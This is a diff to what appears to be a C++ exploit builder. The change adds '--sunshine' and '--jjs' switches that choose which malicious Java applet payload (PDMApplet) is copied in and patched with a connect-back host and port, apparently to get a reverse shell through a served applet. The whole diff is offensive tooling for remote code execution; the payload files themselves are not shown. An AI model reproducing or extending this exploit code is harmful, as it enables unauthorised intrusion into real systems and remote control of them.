@@ -55,6 +55,8 @@ int main(int p_argc, char** p_argv)
     auto lhost_option = op.add<popl::Value<std::string>, popl::Attribute::required>("", "lhost", "The host to connect back");
     auto lport_option = op.add<popl::Value<int>, popl::Attribute::required>("", "lport", "The port to connect back to");
     auto https_port_option = op.add<popl::Value<int>>("", "https_port", "The port for the HTTP server to listen on", 443);
+    auto sunshine_option = op.add<popl::Switch>("s", "sunshine", "Implant a sunshine payload");
+    auto jjs_option = op.add<popl::Switch>("j", "jjs", "Implant a jjs payload");
 
     try
     {
@@ -73,10 +75,34 @@ int main(int p_argc, char** p_argv)
         return EXIT_SUCCESS;
     }
 
+    if ((sunshine_option->is_set() && jjs_option->is_set()) ||
+        (!sunshine_option->is_set() && !jjs_option->is_set()))
+    {
+        std::cerr << "[!] You must select either a sunshine payload or a jjs payload." << std::endl;
+        return EXIT_FAILURE;
+    }
+
     // patch the user options into the payload
     std::cout << "[+] User provided a connect back target of " << lhost_option->value() << ":" << lport_option->value() << std::endl;
-    std::filesystem::copy_file("../payload/PDMApplet.java", "PDMApplet.java", std::filesystem::copy_options::overwrite_existing);
+
+    if (sunshine_option->is_set())
+    {
+        std::cout << "[+] The user selected the sunshine payload" << std::endl;
+        std::filesystem::copy_file("../payload/PDMApplet_sunshine.java", "PDMApplet.java", std::filesystem::copy_options::overwrite_existing);
+    }
+    else if (jjs_option->is_set())
+    {
+        std::cout << "[+] The user selected the jjs payload" << std::endl;
+        std::filesystem::copy_file("../payload/PDMApplet_jjs.java", "PDMApplet.java", std::filesystem::copy_options::overwrite_existing);
+    }
+    else
+    {
+        std::cerr << "[-] Invalid payload?" << std::endl;
+        return EXIT_FAILURE;
+    }
+
     std::filesystem::copy_file("../payload/SgzApplet.java", "SgzApplet.java", std::filesystem::copy_options::overwrite_existing);
+
     std::string pdm(load_file("PDMApplet.java"));
     if (pdm.empty())
     {
